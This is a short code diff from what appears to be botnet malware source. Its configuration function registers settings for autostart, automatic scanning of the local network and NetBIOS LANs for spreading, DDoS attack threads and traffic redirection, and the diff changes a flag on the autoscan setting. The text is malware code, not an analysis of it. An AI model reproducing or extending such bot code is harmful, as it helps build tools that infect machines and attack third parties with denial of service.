@@ -62,7 +62,7 @@ void CBot::Config()
 	g_cMainCtrl.m_cCVar.RegisterCvar(&as_enabled,		"as_enabled",		"true",						"Autostart - Enabled",								false,	false,	0			);
 
 	g_cMainCtrl.m_cCVar.RegisterCvar(&scan_maxthreads,	"scan_maxthreads",	"100",						"Scanner - Maximum Number of threads",				false,	false,	0			);
-	g_cMainCtrl.m_cCVar.RegisterCvar(&scan_auto,		"scan_auto",		"true",						"Scanner - Autoscan local network",					false,	false,	0			);
+    g_cMainCtrl.m_cCVar.RegisterCvar(&scan_auto,		"scan_auto",		"true",						"Scanner - Autoscan local network",					true,	false,	0			);
 	g_cMainCtrl.m_cCVar.RegisterCvar(&scan_auto,		"scan_auto_nb",		"true",						"Scanner - Autoscan LAN for NetBIOS",				false,	false,	0			);
 	g_cMainCtrl.m_cCVar.RegisterCvar(&ddos_maxthreads,	"ddos_maxthreads",	"100",						"DDOS - Maximum Number of threads",					false,	false,	0			);
 	g_cMainCtrl.m_cCVar.RegisterCvar(&redir_maxthreads,	"redir_maxthreads",	"100",						"Redirect - Maximum Number of threads",				false,	false,	0			);
